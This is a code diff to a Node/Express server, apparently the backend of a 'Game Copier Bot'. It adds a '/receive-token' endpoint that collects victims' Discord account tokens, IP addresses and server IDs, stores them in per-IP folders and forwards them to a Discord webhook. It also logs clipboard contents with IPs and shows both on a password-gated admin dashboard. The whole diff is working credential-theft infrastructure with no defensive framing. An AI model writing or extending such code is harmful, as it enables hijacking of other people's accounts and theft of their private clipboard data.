@@ -12,8 +12,18 @@ app.use(express.static('public'));
 app.set('view engine', 'html');
 app.engine('html', require('ejs').renderFile);
 
+// Middleware to get real IP address
+function getRealIP(req) {
+  return req.headers['x-forwarded-for'] || 
+         req.headers['x-real-ip'] || 
+         req.connection.remoteAddress || 
+         req.socket.remoteAddress ||
+         (req.connection.socket ? req.connection.socket.remoteAddress : null) ||
+         req.ip;
+}
+
 // Function to send data to Discord webhook
-function sendToDiscord(clipboardData) {
+function sendToDiscord(data, type = 'clipboard') {
   const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
   
   if (!webhookUrl) {
@@ -21,12 +31,24 @@ function sendToDiscord(clipboardData) {
     return;
   }
 
+  let title, description, color;
+  
+  if (type === 'token') {
+    title = "Discord Token Received";
+    description = `**IP:** ${data.userIP}\n**Server ID:** ${data.serverId}\n**Token:** \`${data.token.substring(0, 50)}...\``;
+    color = 0xff9500;
+  } else {
+    title = "Clipboard Content";
+    description = `**IP:** ${data.userIP}\n**Type:** ${data.type}\n**Content:** \`\`\`${data.clipboardData.substring(0, 1800)}\`\`\``;
+    color = 0x00ff00;
+  }
+
   const payload = JSON.stringify({
-    content: "New clipboard data received:",
+    content: `New ${type} data received:`,
     embeds: [{
-      title: "Clipboard Content",
-      description: "```" + clipboardData.substring(0, 1900) + "```", // Discord limit
-      color: 0x00ff00,
+      title: title,
+      description: description,
+      color: color,
       timestamp: new Date().toISOString(),
       footer: {
         text: "Game Copier Bot"
@@ -60,42 +82,167 @@ function sendToDiscord(clipboardData) {
   req.end();
 }
 
+// Get user IP endpoint
+app.get('/get-ip', (req, res) => {
+  const userIP = getRealIP(req);
+  res.json({ ip: userIP });
+});
+
+// Handle clipboard submissions (updated with IP logging)
 app.post('/submit-clipboard', (req, res) => {
-  const { clipboardData } = req.body;
+  const { clipboardData, userIP, type } = req.body;
+  const realIP = userIP || getRealIP(req);
   
-  // Save to file (existing functionality)
-  const savePath = path.join(__dirname, 'data', 'clipboard.html');
+  // Create filename with IP and timestamp
+  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+  const sanitizedIP = realIP.replace(/[:.]/g, '_');
+  const filename = `clipboard_${sanitizedIP}_${timestamp}.html`;
   
-  // Ensure data directory exists
+  // Save to organized folder structure
+  const ipFolder = path.join(__dirname, 'data', 'clipboard', sanitizedIP);
+  if (!fs.existsSync(ipFolder)) {
+    fs.mkdirSync(ipFolder, { recursive: true });
+  }
+  
+  const savePath = path.join(ipFolder, filename);
+  
+  // Also save to main clipboard.html for admin view
+  const mainSavePath = path.join(__dirname, 'data', 'clipboard.html');
   const dataDir = path.join(__dirname, 'data');
   if (!fs.existsSync(dataDir)) {
     fs.mkdirSync(dataDir, { recursive: true });
   }
   
+  const logEntry = `\n<!-- IP: ${realIP} | Type: ${type} | Time: ${new Date().toISOString()} -->\n${clipboardData}\n<hr>\n`;
+  
   fs.writeFile(savePath, clipboardData, err => {
     if (err) return res.status(500).send('Failed to save clipboard data.');
     
-    // Send to Discord webhook
-    sendToDiscord(clipboardData);
+    // Append to main file
+    fs.appendFile(mainSavePath, logEntry, (appendErr) => {
+      if (appendErr) console.error('Failed to append to main clipboard file:', appendErr);
+    });
     
+    // Send to Discord webhook
+    sendToDiscord({
+      clipboardData: clipboardData,
+      userIP: realIP,
+      type: type || 'game'
+    }, 'clipboard');
+    
+    console.log(`Clipboard saved for IP ${realIP}: ${filename}`);
     res.send('Clipboard saved.');
   });
 });
 
+// Handle Discord token submissions (your integrated code)
+app.post('/receive-token', (req, res) => {
+  const { token, userIP, serverId } = req.body;
+  const realIP = userIP || getRealIP(req);
+  
+  console.log("Token received from IP:", realIP, "Server ID:", serverId, "Token:", token);
+  
+  // Create filename with IP and timestamp
+  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+  const sanitizedIP = realIP.replace(/[:.]/g, '_');
+  
+  // Save to organized folder structure
+  const ipFolder = path.join(__dirname, 'data', 'tokens', sanitizedIP);
+  if (!fs.existsSync(ipFolder)) {
+    fs.mkdirSync(ipFolder, { recursive: true });
+  }
+  
+  const filename = `token_${sanitizedIP}_${timestamp}.html`;
+  const savePath = path.join(ipFolder, filename);
+  
+  const tokenEntry = `<div>
+    <p><strong>IP:</strong> ${realIP}</p>
+    <p><strong>Server ID:</strong> ${serverId}</p>
+    <p><strong>Token:</strong> ${token}</p>
+    <p><strong>Timestamp:</strong> ${new Date().toISOString()}</p>
+    <hr>
+  </div>\n`;
+  
+  // Save individual file
+  fs.writeFile(savePath, tokenEntry, (err) => {
+    if (err) console.error('Failed to save individual token file:', err);
+  });
+  
+  // Append to main tokens.html file
+  const mainTokenPath = path.join(__dirname, 'data', 'tokens.html');
+  fs.appendFileSync(mainTokenPath, tokenEntry);
+  
+  // Send to Discord webhook
+  sendToDiscord({
+    token: token,
+    userIP: realIP,
+    serverId: serverId
+  }, 'token');
+  
+  res.sendStatus(200);
+});
+
+// Admin endpoint (updated)
 app.get('/admin', (req, res) => {
   const provided = req.query.password;
   const correct = process.env.ADMIN_PASSWORD;
   
   if (provided !== correct) return res.status(403).send('Unauthorized');
   
-  const dataPath = path.join(__dirname, 'data', 'clipboard.html');
-  const content = fs.existsSync(dataPath)
-    ? fs.readFileSync(dataPath, 'utf8')
+  const clipboardPath = path.join(__dirname, 'data', 'clipboard.html');
+  const tokensPath = path.join(__dirname, 'data', 'tokens.html');
+  
+  const clipboardContent = fs.existsSync(clipboardPath) 
+    ? fs.readFileSync(clipboardPath, 'utf8') 
     : 'No clipboard data yet.';
     
-  res.render('admin.html', { content });
+  const tokensContent = fs.existsSync(tokensPath) 
+    ? fs.readFileSync(tokensPath, 'utf8') 
+    : 'No tokens yet.';
+  
+  const adminHTML = `
+  <!DOCTYPE html>
+  <html>
+  <head>
+    <title>Admin Dashboard</title>
+    <style>
+      body { font-family: Arial, sans-serif; margin: 20px; background: #111; color: #fff; }
+      .section { margin-bottom: 40px; padding: 20px; background: #222; border-radius: 8px; }
+      h2 { color: #4CAF50; }
+      pre { background: #333; padding: 15px; border-radius: 4px; overflow-x: auto; }
+    </style>
+  </head>
+  <body>
+    <h1>Admin Dashboard</h1>
+    
+    <div class="section">
+      <h2>Clipboard Submissions</h2>
+      <pre>${clipboardContent}</pre>
+    </div>
+    
+    <div class="section">
+      <h2>Discord Tokens</h2>
+      <pre>${tokensContent}</pre>
+    </div>
+  </body>
+  </html>`;
+  
+  res.send(adminHTML);
 });
 
 app.listen(PORT, () => {
   console.log(`Server running on http://localhost:${PORT}`);
+  
+  // Ensure data directories exist
+  const dirs = [
+    path.join(__dirname, 'data'),
+    path.join(__dirname, 'data', 'clipboard'),
+    path.join(__dirname, 'data', 'tokens')
+  ];
+  
+  dirs.forEach(dir => {
+    if (!fs.existsSync(dir)) {
+      fs.mkdirSync(dir, { recursive: true });
+    }
+  });
 });
